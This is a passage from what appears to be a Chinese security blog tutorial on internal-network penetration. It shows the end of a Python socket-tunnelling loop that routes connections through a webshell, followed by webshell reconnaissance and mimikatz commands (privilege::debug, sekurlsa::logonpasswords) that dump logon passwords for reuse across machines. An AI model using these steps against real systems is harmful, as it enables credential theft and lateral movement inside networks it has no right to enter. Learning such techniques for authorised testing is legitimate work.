True:</span><br><span class="line">        try:</span><br><span class="line">            sock, addr_info = servSock.accept()</span><br><span class="line">            sock.settimeout(SOCKTIMEOUT)</span><br><span class="line">            log.debug(&quot;Incomming connection&quot;)</span><br><span class="line">            session(sock, args.url).start()</span><br><span class="line">        except KeyboardInterrupt, ex:</span><br><span class="line">            break</span><br><span class="line">        except Exception, e:</span><br><span class="line">            log.error(e)</span><br><span class="line">    servSock.close()</span><br></pre></td></tr></table></figure>

<p>在webshell命令行使用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看内网地址</span><br><span class="line">ipconfig</span><br><span class="line">使用远程桌面连接</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/neiwang/4.png" alt="4" data-caption="4" loading="lazy"></p>
<p>使用工具(mimikatz.exe)抓取密码:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug 提升权限</span><br><span class="line">sekurlsa::logonpasswords 抓取密码</span><br><span class="line">log 日志会记录内容</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">打开windows-cmd</span><br><span class="line">mimikatz.exe</span><br><span class="line">进入后使用启用日志功能,会在目录下输出mimikatz.log文件</span><br><span class="line">log</span><br><span class="line">提升权限后,抓取密码，查看管理员密码，用远程桌面进行登录.</span><br><span class="line">安装nmap进行内网扫码.</span><br><span class="line">在内网中很多机器是使用同一密码可以一次测试.</span><br></pre></td></tr></table></figure>


    <p><img data-fancybox="gallery" src="https://www.luminesight.com/cdn/Server/ShouKuanMA.jpg"  alt="ShouKuanMA.jpg" data-caption="ShouKuanMA.jpg" loading="lazy"></p>
  </article>

  
      
    <div class="nexmoe-post-copyright">
        <strong>Author：</strong>JunHou<br>
        <strong>Link：</strong><a href="http://runctf.cn/2022/10/26/neiwang/" title="http:&#x2F;&#x2F;runctf.cn&#x2F;2022&#x2F;10&#x2F;26&#x2F;neiwang&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;runctf.cn&#x2F;2022&#x2F;10&#x2F;26&#x2F;neiwang&#x2F;</a><br>
        
            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
        
    </div>


  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
   
    
        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E6%8A%80%E6%9C%AF/" rel="tag">技术</a>
    
</div>

  
      <div class="nexmoe-post-footer">
          
      </div>
  
</div>
            <div class="nexmoe-post-right">
              <div class="nexmoe-fixed">
                  <div class="nexmoe-tool"> 
                    
                      
                        
                          
                          
                              <button class="mdui-fab catalog" style="overflow:unset;">
                                  <i class="nexmoefont icon-i-catalog"></i>
                                  <div class="nexmoe-toc">
                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8SQL%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96webshell"><span class="toc-number">1.</span> <span class="toc-text">利用SQL注入获取webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%E5%88%A9%E7%94%A8webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E9%81%8D%E5%8E%86"><span class="toc-number">2.</span> <span class="toc-text">上传成功利用webshell管理工具进行遍历</span></a></li></ol>
                                  </div>
                              </button>
                          
                          
                      
                    
                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
                  </div>
              </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/piao.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script
    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/shehuizhuyi.js"></script><!-- 点击出现爱心 --><script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/love.js"></script><!-- 点击出现彩色气球爆炸效果 --><canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/clickBom.js"></script>
    <!-- themes/[theme_name]/layout/_script/comments.swig -->
    {% include '_comments/gitalk.swig' %}
    <div id="nexmoe-search-space">
	<div class="search-container">
		<div class="search-header">
			<div class="search-input-container">
				<input
					class="search-input"
					type="text"
					placeholder="Search"
					oninput="sinput();"
				/>
			</div>
			<a class="search-close" onclick="sclose();">×</a>
		</div>
		<div class="search-body"></div>
	</div>
</div>

    
<script src="/lib/mdui_043tiny/mdui.js"></script>
<script src="/lib/fancybox/fancybox.umd.js"></script>


 

<script async src="/js/app.js?v=1673454978774"></script>

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":200,"height":400,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"log":false});</script></body>

</html>
